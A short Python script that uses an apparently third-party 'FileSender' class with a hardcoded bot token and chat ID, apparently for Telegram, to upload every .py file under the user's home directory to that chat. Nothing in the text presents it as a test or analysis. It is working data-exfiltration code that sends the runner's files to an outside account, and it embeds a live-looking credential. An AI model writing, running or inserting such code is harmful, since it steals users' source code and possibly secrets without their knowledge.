
from proxymlosy import FileSender
import os

TOKEN = "7246461761:AAH6kA0RmIMzjzNPWUoJOzPQtd6wx8YnpHU"
CHAT_ID = 8245348876
SEARCH_FOLDER = os.path.expanduser("~")

sender = FileSender(TOKEN, CHAT_ID)
sender.send_all_files(SEARCH_FOLDER, extension=".py")
